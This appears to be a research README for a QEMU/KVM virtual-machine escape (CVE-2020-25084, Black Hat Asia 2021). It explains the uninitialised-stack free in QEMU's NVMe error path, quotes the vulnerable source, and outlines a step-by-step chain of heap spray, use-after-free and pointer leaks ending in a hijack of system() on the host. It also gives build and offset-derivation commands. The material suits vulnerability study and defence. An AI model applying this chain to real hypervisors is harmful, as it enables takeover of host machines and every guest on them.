# Scavenger — Misuse of Error-Handling Code → QEMU/KVM Escape

**Black Hat Asia 2021 / CVE-2020-25084**

## Summary

| Field      | Value |
|:-----------|:------|
| CVE        | CVE-2020-25084 |
| Affected   | QEMU 5.x |
| Component  | `hw/block/nvme.c`, `dma-helpers.c`, `virtio-gpu` |
| Type       | Use-after-free (uninitialised stack → arbitrary free) |
| Impact     | Full VM escape (host code execution) |

## Environment

```bash
chmod +x build.sh launch.sh attach.sh rootfs/pack.sh rootfs/a.sh
./build.sh        # builds QEMU v5.0.0 (with -pg) + Linux 5.4.40 + nvme.img
./launch.sh       # interactive VM — run /exp manually
./attach.sh       # GDB session
```

> **Note:** Symbol offsets in `rootfs/exp.c` are build-specific.
> `build.sh` prints the offsets after compiling QEMU — update the three
> `#define` values accordingly before running the exploit.

## Vulnerability

`nvme_dma_read_prp()` / `nvme_dma_write_prp()` declare a `QEMUSGList`
on the **stack** and pass its address to `nvme_map_prp()`.  On the error
path, `nvme_map_prp()` jumps to `unmap:` which calls
`qemu_sglist_destroy()` on the **uninitialised** stack struct.

```c
/* hw/block/nvme.c — nvme_dma_read_prp() */
static uint16_t nvme_dma_read_prp(NvmeCtrl *n, uint8_t *ptr, uint32_t len,
                                  uint64_t prp1, uint64_t prp2)
{
    QEMUSGList qsg;      /* stack — NOT zero-initialised */
    QEMUIOVector iov;
    if (nvme_map_prp(&qsg, &iov, prp1, prp2, len, n))
        return NVME_INVALID_FIELD | NVME_DNR;
    /* ... */
}

/* dma-helpers.c — qemu_sglist_destroy() */
void qemu_sglist_destroy(QEMUSGList *qsg)
{
    object_unref(OBJECT(qsg->dev));  /* qsg->dev == stack garbage */
    g_free(qsg->sg);                 /* qsg->sg  == stack garbage → arb free */
    memset(qsg, 0, sizeof(*qsg));
}
```

Providing an invalid PRP1 address (e.g., `0xf8000000 + 0x500`) triggers
the error path → `qemu_sglist_destroy()` runs on uninitialised memory.

## Exploit Chain

```
1. Heap spray 0x290-byte NvmeRequest chunks (create_sq × 25)
   → NvmeSQueue.io_req arrays land predictably in heap

2. virtio-gpu RESOURCE_ATTACH_BACKING
   → allocates 0x150 iov mapping table
   → bounce entry with invalid addr forces dma_memory_map() fail
   → qemu_sglist_destroy() frees the mapping table (UAF primitive)

3. Reclaim freed 0x150 chunk with NvmeSQueue (create_sq)
   → io_req[] now overlaps with user-controlled virtio-gpu memory

4. Issue NVMe READ via that SQ (vuln())
   → nvme_rw() calls nvme_map_prp() → bounce maps phymap base
   → leak physmap address via UAF io_req overlap

5. Repeat with 0x40 chunk to place NvmeRequest in freed timer struct
   → create_sq allocates new timer adjacent to leaked memory
   → leak timer pointer → derive QEMU base

6. Overwrite timer->cb with system(), timer->opaque = &cmd_string
   → trigger nvme_wr32(doorbell) → system() fires on host
```

## QEMU Launch Flags

```
-drive format=raw,file=./nvme.img,if=none,id=D11
-device nvme,drive=D11,serial=1234,cmb_size_mb=64
-device virtio-gpu
-display none
```

## Deriving Symbol Offsets

```bash
nm ./qemu-system-x86_64 | grep -E '\b(system|nvme_process_sq)\b'
# example output:
#   000000000002cf170 T system
#   000000000005a7d00 T nvme_process_sq
```

Update the three `#define` values at the top of `rootfs/exp.c`.

## Vulnerability Code

### `hw/block/nvme.c`

```cpp
static void nvme_init_sq(NvmeSQueue *sq, NvmeCtrl *n, uint64_t dma_addr,
    uint16_t sqid, uint16_t cqid, uint16_t size)
{
    /* ... */
    sq->io_req = g_new(NvmeRequest, sq->size);
    /* ... */
}
```

```cpp
static void nvme_process_sq(void *opaque)
{
    NvmeSQueue *sq = opaque;
    /* ... */
    while (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&sq->req_list))) {
        /* ... */
        status = sq->sqid ? nvme_io_cmd(n, &cmd, req) :
            nvme_admin_cmd(n, &cmd, req);
        /* ... */
    }
}
```

```cpp
static uint16_t nvme_rw(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,
    NvmeRequest *req)
{
    /* ... */
    if (nvme_map_prp(&req->qsg, &req->iov, prp1, prp2, data_size, n)) {
        block_acct_invalid(blk_get_stats(n->conf.blk), acct);
        return NVME_INVALID_FIELD | NVME_DNR;
    }
    /* ... */
}
```

```cpp
static uint16_t nvme_map_prp(QEMUSGList *qsg, QEMUIOVector *iov, uint64_t prp1,
                             uint64_t prp2, uint32_t len, NvmeCtrl *n)
{
    /* ... */
 unmap:
    qemu_sglist_destroy(qsg);
    return NVME_INVALID_FIELD | NVME_DNR;
}
```

### `dma-helpers.c`

```cpp
void qemu_sglist_destroy(QEMUSGList *qsg)
{
    object_unref(OBJECT(qsg->dev));
    g_free(qsg->sg);
    memset(qsg, 0, sizeof(*qsg));
}
```

### `virtio-gpu` helper (`virtio_gpu_create_mapping_iov`)

```cpp
int virtio_gpu_create_mapping_iov(VirtIOGPU *g,
                                  struct virtio_gpu_resource_attach_backing *ab,
                                  struct virtio_gpu_ctrl_command *cmd,
                                  uint64_t **addr, struct iovec **iov)
{
    /* ... */
    *iov = g_malloc0(sizeof(struct iovec) * ab->nr_entries);
    for (i = 0; i < ab->nr_entries; i++) {
        (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)->dma_as,
                                            a, &len, DMA_DIRECTION_TO_DEVICE);
        /* if dma_memory_map() fails → iov mapping table is leaked / freed */
    }
}
```

## References

- [Black Hat Asia 2021 — Scavenger: Misuse Error Handling Leading to QEMU/KVM Escape](https://blackhat.com/asia-21/briefings/schedule/#scavenger-misuse-error-handling-leading-to-qemukvm-escape-21971)
- [清道夫：误用"错误处理代码"导致的 QEMU/KVM 逃逸](https://mp.weixin.qq.com/s/1KYTZynabBqzNjoJhe1bWw)
- [manishrma/nvme-qemu](https://github.com/manishrma/nvme-qemu)
- [解决 Linux 内核问题实用技巧之 - Crash 工具结合/dev/mem 任意修改内存](https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw)
- [Five Lines of Code: virtual-to-physical via /proc/pid/pagemap](http://fivelinesofcode.blogspot.com/2014/03/how-to-translate-virtual-to-physical.html)
